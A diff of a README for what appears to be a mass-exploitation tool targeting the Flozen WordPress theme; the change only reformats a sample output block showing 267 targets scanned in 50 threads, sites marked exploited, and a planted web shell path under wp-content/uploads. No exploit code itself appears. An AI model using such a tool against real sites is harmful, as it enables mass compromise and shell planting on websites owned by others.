@@ -32,14 +32,14 @@ The Flozen Theme for WordPress (versions up to and including 1.5.1) is vulnerabl
   
 ### output :
 
-[?] Enter filename with targets: list.txt
-[?] Enter threads (5-50): 50
-[*] Loading targets...
-[+] Loaded 267 targets
-[*] Starting 50 threads...
-[!] Gak Ada Bro Themes nya!: http://target.com
-[+] Gas Exploit Cuk! http://example.com/ | Version: 1.2.8 🚩💉
-[+] Shell Ada Bro! http://example.com/wp-content/uploads/nasa-custom-fonts/shadow/index.php
+- [?] Enter filename with targets: list.txt
+- [?] Enter threads (5-50): 50
+- [*] Loading targets...
+- [+] Loaded 267 targets
+- [*] Starting 50 threads...
+- [!] Gak Ada Bro Themes nya!: http://target.com
+- [+] Gas Exploit Cuk! http://example.com/ | Version: 1.2.8 🚩💉
+- [+] Shell Ada Bro! http://example.com/wp-content/uploads/nasa-custom-fonts/shadow/index.php
 
 
 ## Disclaimer :
